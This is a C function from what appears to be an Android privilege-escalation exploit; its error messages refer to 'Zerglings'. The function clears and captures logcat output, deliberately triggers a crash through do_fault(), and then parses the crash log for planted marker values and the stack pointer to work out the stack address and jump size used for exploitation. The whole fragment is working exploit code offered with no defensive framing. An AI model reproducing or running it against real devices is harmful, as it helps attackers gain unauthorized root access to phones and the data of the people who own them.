static uint32_t find_stack_addr()
{
	uint32_t fault_addr = 0;
	char buf[1024], *ptr = NULL;
	FILE *f = NULL;
	long pos = 0;
	uint32_t sp=0, over=0;

	system("/system/bin/logcat -c");
	unlink(crashlog);

	if ((logcat_pid = fork()) == 0) {
		char *a[] = {"/system/bin/logcat",  "-f", crashlog, NULL};
		execve(*a, a, environ);
		exit(1);
	}
	sleep(3);

	if (do_fault() < 0)
		die("[-] Zerglings did not cause crash");
	/* Give logcat time to write to file
	 */
	sleep(3);
	if ((f = fopen(crashlog, "r")) == NULL)
		die("[-] Zerglings did not leave stuff at all");
	fseek(f, pos, SEEK_SET);
	do {
		memset(buf, 0, sizeof(buf));
		if (!fgets(buf, sizeof(buf), f))
			break;
		if ((ptr = strstr(buf, "  4752455a")) != NULL && stack_addr == 0x41414141) {
			ptr -= 8;
			stack_addr = (uint32_t)strtoul(ptr, NULL, 16);
		}
		else if ((ptr = strstr(buf, "  5245564f")) != NULL && !over) {
			ptr -= 8;
			over = (uint32_t)strtoul(ptr, NULL, 16);
		}
		else if ((ptr = strstr(buf, "  sp ")) != NULL && !sp) {
			ptr += 5;
			sp = (uint32_t)strtoul(ptr, NULL, 16);
		}
	} while (!feof(f));
	pos = ftell(f);
	fclose(f);

	if(over && sp)
		jumpsz = over - sp;
	
	return stack_addr;
}
